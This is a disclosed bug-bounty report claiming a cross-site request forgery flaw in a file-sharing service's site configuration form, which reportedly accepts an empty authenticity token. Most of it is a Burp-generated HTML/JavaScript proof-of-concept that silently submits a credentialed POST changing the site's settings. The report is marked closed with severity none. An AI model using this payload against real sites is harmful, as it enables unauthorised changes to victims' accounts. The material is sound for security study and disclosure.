# CSRF @ configuration 

## Report Details
- **Report ID**: 208734
- **URL**: https://hackerone.com/reports/208734
- **State**: Closed
- **Severity**: none
- **Submitted**: 2017-02-24T22:26:35.099Z
- **Disclosed**: 2017-05-27T16:46:05.581Z

## Reporter
- **Username**: simba50091
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: files

## Vulnerability Information
Enter the support PIN from your test site (if applicable): 
Enter the name of your test site (if applicable): gaming2
Enter the subdomain from your test site (if applicable): gaming2

Fill in the rest of your report below:
----
Greeting guys , 
i found a CSRF Bug at the configuration - > General form in all parameters 
the problem is in the "authenticity_token" parameter which is not properly set well , because it accept the null value which i bypassed it 
POC: 
1-generate a CSRF HTML form from the configuration -> general 
2-replace "authenticity_token" parameter value with null 
3-test it , it success 

POC CSRF FORM:
-------
<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <script>
      function submitRequest()
      {
        var xhr = new XMLHttpRequest();
        xhr.open("POST", "https://gaming2.brickftp.com/sites/update", true);
        xhr.setRequestHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8");
        xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.5");
        xhr.setRequestHeader("Content-Type", "multipart/form-data; boundary=---------------------------13127814166702694341666648723");
        xhr.withCredentials = true;
        var body = "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"utf8\"\r\n" +
          "\r\n" +
          "\xe2\x9c\x93\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"_method\"\r\n" +
          "\r\n" +
          "patch\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"authenticity_token\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"group\"\r\n" +
          "\r\n" +
          "general\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[name]\"\r\n" +
          "\r\n" +
          "gamingtoooorrrrr\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[subdomain]\"\r\n" +
          "\r\n" +
          "gaming2\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[domain]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[email]\"\r\n" +
          "\r\n" +
          "hmahmoud@promex.me\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[language]\"\r\n" +
          "\r\n" +
          "en\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[bundle_expiration]\"\r\n" +
          "\r\n" +
          "30\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[overage_notify]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[welcome_email_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[welcome_email_enabled]\"\r\n" +
          "\r\n" +
          "1\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[welcome_email_cc]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[welcome_custom_text]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[ask_about_overwrites]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[show_request_access_link]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[anon_uploads_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[anon_uploads_path]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[windows_mode_ftp]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[ssl_required]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[ssl_required]\"\r\n" +
          "\r\n" +
          "1\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[tls_disabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[sftp_user_root_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[sftp_user_root_enabled]\"\r\n" +
          "\r\n" +
          "1\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[opt_out_global]\"\r\n" +
          "\r\n" +
          "false\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[oauth_google_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[user_lockout]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[user_lockout_tries]\"\r\n" +
          "\r\n" +
          "5\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[user_lockout_within]\"\r\n" +
          "\r\n" +
          "6\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[user_lockout_lock_period]\"\r\n" +
          "\r\n" +
          "24\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[include_password_in_welcome_email]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[disable_password_reset]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[password_min_length]\"\r\n" +
          "\r\n" +
          "8\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[password_require_letter]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[password_require_number]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[password_require_mixed]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[password_require_special]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[allowed_file_types]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[allowed_ips]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[use_provided_modified_at]\"\r\n" +
          "\r\n" +
          "false\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[days_to_retain_backups]\"\r\n" +
          "\r\n" +
          "30\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[color2_top]\"\r\n" +
          "\r\n" +
          "#000000\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[color2_top_text]\"\r\n" +
          "\r\n" +
          "#ffffff\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[color2_link]\"\r\n" +
          "\r\n" +
          "#d34f5d\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[color2_text]\"\r\n" +
          "\r\n" +
          "#d34f5d\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[site_header]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[site_footer]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[site_css]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[icon128]\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[icon48]\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[icon32]\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[icon16]\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[logo]\"; filename=\"\"\r\n" +
          "Content-Type: application/octet-stream\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[login_help_text]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[tab_config]\"\r\n" +
          "\r\n" +
          "brick_default\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"utf8\"\r\n" +
          "\r\n" +
          "\xe2\x9c\x93\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"authenticity_token\"\r\n" +
          "\r\n" +
          "z19IcfV537Y9EPny3LIkYlhi/Ahzw5AtLi6u51q16deQIJuC/XmIubfsSQHiwdgx41ZS3SfLmJqz/7WOGIxThQ==\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"api_key[name]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"api_key[expires_at]\"\r\n" +
          "\r\n" +
          "\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"api_key[permission_set]\"\r\n" +
          "\r\n" +
          "full\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[api_uploads_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[api_root_folder]\"\r\n" +
          "\r\n" +
          "API Uploads\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[api_user_creation_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[air_enabled]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[air_app_name]\"\r\n" +
          "\r\n" +
          "BrickFTP Uploader\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[air_app_description]\"\r\n" +
          "\r\n" +
          "Shares your files using your BrickFTP account.\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"site[air_public_download]\"\r\n" +
          "\r\n" +
          "0\r\n" +
          "-----------------------------13127814166702694341666648723\r\n" +
          "Content-Disposition: form-data; name=\"commit\"\r\n" +
          "\r\n" +
          "Save\r\n" +
          "-----------------------------13127814166702694341666648723--\r\n";
        var aBody = new Uint8Array(body.length);
        for (var i = 0; i < aBody.length; i++)
          aBody[i] = body.charCodeAt(i);
        xhr.send(new Blob([aBody]));
      }
    </script>
    <form action="#">
      <input type="button" value="Submit request" onclick="submitRequest();" />
    </form>
  </body>
</html>

------

Best Regards
Hameed



## Attachments
No attachments
